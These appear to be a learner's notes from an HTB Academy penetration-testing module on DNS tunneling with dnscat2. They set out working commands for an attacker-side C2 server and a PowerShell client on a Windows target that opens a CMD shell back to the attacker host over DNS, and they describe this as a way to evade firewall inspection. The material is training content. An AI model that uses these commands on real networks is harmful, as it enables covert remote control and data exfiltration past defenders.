# Pivoting, Tunneling, and Port Forwarding — DNS Tunneling with Dnscat2

**Module:** HTB Academy – Pivoting, Tunneling, and Port Forwarding

---

## What is Dnscat2?

- Tunneling tool that sends data between two hosts **using the DNS protocol**.
- Data travels inside **TXT records** within DNS traffic.
- Provides an **encrypted C2 (Command & Control) channel**.

### Why DNS Tunneling Works as an Evasion Technique

- AD/corporate environments almost always have their own internal DNS server, which resolves names and forwards unresolved queries to external DNS servers.
- Dnscat2 abuses this: when the local DNS server tries to resolve an address, the "resolution" is actually **exfiltrating/tunneling data** to an external attacker-controlled DNS server instead of performing a legitimate lookup.
- **Stealth value:** DNS is rarely fully blocked (it has to work for normal browsing), and many firewalls focus on stripping/inspecting **HTTPS** traffic — DNS tunneling can evade that kind of detection.

## Server Setup (Attack Host)

### Clone & Install

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Start the Server

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

- `host` → attack host IP; `port=53` → standard DNS port; `domain` → domain used for the tunneled queries.
- Server output includes a **secret key** (pre-shared secret), e.g.:
  ```
  0ec04a91cd1e963f8c03ca499d589d21
  ```
  — required by clients to authenticate and encrypt their session.
- Server enforces: **"All connections must be encrypted."**

Example client connection strings it provides:
```bash
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
# or, without a domain name, talking directly to the server:
./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```
- Clients connect directly on **UDP port 53**.

## Client Setup — dnscat2-powershell (Windows Target)

### Clone to Attack Host, Then Transfer to Target

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

### Import & Run on the Windows Target

```powershell
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

- `-PreSharedSecret` **must match** the server's generated secret — ensures the session is authenticated and encrypted.
- `-Exec cmd` → spawns a CMD shell session back through the tunnel.

### Confirming Session Establishment (Server Side)

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
```

## Using the Dnscat2 Console

### List Available Commands

```
dnscat2> ?
```
```
echo, help, kill, quit, set, start, stop, tunnels, unset, window, windows
```

### Interact with a Session

```
dnscat2> window -i 1
```

- Drops into an interactive console session — anything typed is sent to the client, and the client's output is displayed live.
- `ctrl-z` → return to the dnscat2 main prompt without killing the session.

**Result:** direct interactive shell access:
```
C:\Windows\system32>
```

## Key Takeaways

- Dnscat2 tunnels C2 traffic inside **DNS TXT records** — a channel that's hard to fully block and often under-inspected compared to HTTP(S).
- **Pre-shared secret** is central to both authentication and encryption of the tunnel — protect/generate it carefully (security strength depends on it).
- Setup = **server on attacker infrastructure** (`dnscat2.rb`, listening on UDP/53) + **client on the target** (native `dnscat` binary or `dnscat2-powershell` for Windows).
- Once connected, the `window -i <id>` command drops into a live interactive session with the target.
- Strongly recommended to **practice broadly** — this module only scratches the surface of dnscat2's capabilities; creative use in engagements is encouraged.
